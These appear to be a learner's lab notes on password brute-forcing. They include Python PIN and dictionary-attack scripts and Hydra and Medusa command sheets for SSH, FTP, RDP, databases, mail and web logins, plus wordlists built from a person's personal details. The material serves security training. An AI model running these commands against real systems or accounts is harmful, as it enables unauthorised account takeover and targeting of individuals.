# Brute-forcing a 4-digit PIN

The target app has an endpoint `/pin` that checks a 4-digit PIN.
We’ll brute-force from `0000` to `9999` with Python.

<pre>import requests

ip = "127.0.0.1"  # Change to target IP
port = 1234       # Change to target port

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    print(f"Attempted PIN: {formatted_pin}")
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break</pre>


# Dictionary Attacks

A dictionary attack uses a pre-made list of possible passwords instead of testing every combination like brute force.
It works well because many people choose predictable passwords (e.g., words, names, patterns).

| Wordlist                                  | Description                  | Use                        | Source         |
| ----------------------------------------- | ---------------------------- | -------------------------- | -------------- |
| rockyou.txt                               | Millions of leaked passwords | Password cracking          | RockYou breach |
| top-usernames-shortlist.txt               | Common usernames             | Quick username brute force | SecLists       |
| xato-net-10-million-usernames.txt         | 10M usernames                | Thorough brute force       | SecLists       |
| 2023-200\_most\_used\_passwords.txt       | Top 200 passwords            | Target common reuse        | SecLists       |
| Default-Credentials/default-passwords.txt | Default logins               | Try default creds          | SecLists       |


**Dictionary Attack Code:**

<pre>import requests

ip = "127.0.0.1"  # Change to target IP
port = 1234       # Change to target port

# Get common password list
passwords = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"
).text.splitlines()

# Try each password
for password in passwords:
    print(f"Attempted password: {password}")
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break</pre>


# Hydra

`hydra [login_options] [password_options] [attack_options] [service_options]`

| Option                | Purpose                  | Example                          |
| --------------------- | ------------------------ | -------------------------------- |
| `-l USER` / `-L FILE` | Single user or user list | `-l admin` / `-L users.txt`      |
| `-p PASS` / `-P FILE` | Single pass or pass list | `-p 123456` / `-P passwords.txt` |
| `-t N`                | Threads                  | `-t 4`                           |
| `-f`                  | Stop on first success    | `-f`                             |
| `-s PORT`             | Non-default port         | `-s 2222`                        |
| `-v` / `-V`           | Verbose / Very verbose   | `-V`                             |
| `service://target`    | Protocol & host          | `ssh://192.168.1.10`             |


| Service       | Description            | Example                                                                                  |
| ------------- | ---------------------- | ---------------------------------------------------------------------------------------- |
| FTP           | File Transfer Protocol | `hydra -l admin -P pass.txt ftp://192.168.1.100`                                         |
| SSH           | Secure Shell           | `hydra -l root -P pass.txt ssh://192.168.1.100`                                          |
| HTTP GET/POST | Web login              | `hydra -l admin -P pass.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` |
| SMTP          | Email send service     | `hydra -l admin -P pass.txt smtp://mail.com`                                             |
| POP3          | Email retrieval        | `hydra -l user@mail.com -P pass.txt pop3://mail.com`                                     |
| IMAP          | Email access           | `hydra -l user@mail.com -P pass.txt imap://mail.com`                                     |
| MySQL         | Database               | `hydra -l root -P pass.txt mysql://192.168.1.100`                                        |
| MSSQL         | Microsoft SQL          | `hydra -l sa -P pass.txt mssql://192.168.1.100`                                          |
| VNC           | Remote desktop         | `hydra -P pass.txt vnc://192.168.1.100`                                                  |
| RDP           | Windows Remote Desktop | `hydra -l admin -P pass.txt rdp://192.168.1.100`                                         |


**Some advanced attacks using Hytdra:**

1. HTTP Basic Auth

`hydra -L usernames.txt -P passwords.txt www.example.com http-get`

2. Multiple SSH Targets

`hydra -l root -p toor -M targets.txt ssh`

3. FTP on Non-Standard Port

`hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp`

4. Web Form Login

`hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`

5. Advanced RDP Attack

`hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`


# Basic HTTP Authentication

Basic Auth is a simple way websites protect certain pages. It works by asking for a username and password before giving access.

When you try to open a protected page, the server replies with a 401 Unauthorized status and tells your browser it needs login credentials. Your browser shows a login popup.

If you enter your username and password, your browser combines them like this:

`username:password`

Then it encodes that string in Base64 and sends it in the Authorization header like:

`Authorization: Basic <encoded_credentials>`

The server decodes it, checks the credentials, and either grants or denies access.


Download a password list:

`curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt`

Run Hydra:

`hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt <IP:PORT> http-get / -s 81`


# Login Forms

When Hydra is used against a login form in a real-world scenario, you won’t be pointing it at localhost or a placeholder string like IP — you’ll target the actual server’s IP address or domain name.


`hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"`

In a real engagement, if the login form is hosted at http://192.168.56.10:8080/login, the command becomes:

`hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 192.168.56.10 -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"`

Or, if it’s on a live domain such as `portal.example.com`:

`hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f portal.example.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"`


# Medusa

**Basic Syntax**

`medusa [target_options] [credential_options] -M module [module_options]`

| Option           | Meaning                              | Example             |
| ---------------- | ------------------------------------ | ------------------- |
| `-h <host>`      | Single target host                   | `-h 192.168.1.10`   |
| `-H <file>`      | File with list of target hosts       | `-H targets.txt`    |
| `-u <user>`      | Single username                      | `-u admin`          |
| `-U <file>`      | File with usernames                  | `-U users.txt`      |
| `-p <pass>`      | Single password                      | `-p admin123`       |
| `-P <file>`      | File with passwords                  | `-P passwords.txt`  |
| `-M <module>`    | Module to use (ssh, ftp, http, etc.) | `-M ssh`            |
| `-m "<options>"` | Extra module-specific parameters     | `-m DIR:/login.php` |
| `-n <port>`      | Non-default port                     | `-n 2222`           |
| `-t <num>`       | Parallel threads                     | `-t 4`              |
| `-f`             | Stop after first success on host     | `-f`                |
| `-F`             | Stop after first success on any host | `-F`                |


**Example Attacks**

**1. SSH Brute-Force**

`medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh`

- Target: 192.168.0.100
- Usernames: usernames.txt
- Passwords: passwords.txt
- Module: ssh

**2. Multiple Web Servers (Basic HTTP Auth)**

`medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET`

- Targets: from web_servers.txt
- Test usernames/passwords
- Use HTTP module with GET method

**3. Test for Empty or Default Passwords**

`medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh`

- -e n → empty passwords
- -e s → password = username
- Useful for finding weak/default accounts

**4. Web Form Brute-Force**

`medusa -h www.example.com -U users.txt -P passwords.txt -M web-form -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`

- Target: www.example.com
- POSTs to a login form with username/password placeholders
- F=Invalid tells Medusa what failure message to look for

# Web Services:

**1. SSH Brute-Force:**

We know the username is sshuser and the target’s SSH service is on port 22.

`medusa -h 192.168.1.50 -n 22 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3`

- -h 192.168.1.50 → target host IP
- -n 22 → SSH port
- -u sshuser → known username
- -P → password list
- -M ssh → SSH module
- -t 3 → 3 parallel attempts


**2. Discovering FTP Service**

Once inside via SSH, check for other services:

`netstat -tulpn | grep LISTEN`

**3. FTP Brute-Force**
 
We find an ftpuser directory — likely the username.

`medusa -h 192.168.1.50 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5`

- -M ftp → FTP module
- -t 5 → more parallel attempts for faster results

**4. FTP Login & File Retrieval**

<pre>ftp ftp://ftpuser:letmein@192.168.1.50
ftp> ls
ftp> get flag.txt
ftp> exit
cat flag.txt</pre>

# Custom Wordlists

**1. Username Generation – Username Anarchy:**

<pre>sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Smith > jane_usernames.txt</pre>

**2. Password Generation – CUPP**

<pre>sudo apt install cupp -y
cupp -i</pre>

<pre>First Name: Jane
Surname: Smith
Nickname: Janey
Birthdate: 11121990
Partner's Name: Jim
Partner's Nickname: Jimbo
Partner's Birthdate: 12121990
Pet's Name: Spot
Company: AHI
Keywords: hacker,blue
Special chars? y
Random numbers? y
Leet mode? y</pre>

**3. Filtering for Password Policy**

AHI password rules:

- Min length 6
- At least 1 uppercase, 1 lowercase, 1 number
- At least 2 special characters (!@#$%^&*)

<pre>grep -E '^.{6,}$' jane.txt \
| grep -E '[A-Z]' \
| grep -E '[a-z]' \
| grep -E '[0-9]' \
| grep -E '([!@#$%^&*].*){2,}' \
> jane-filtered.txt</pre>

**4. Brute-Force with Hydra**

Use jane_usernames.txt & jane-filtered.txt against target login.

`hydra -L jane_usernames.txt -P jane-filtered.txt 192.168.1.75 -s 8080 -f http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"`
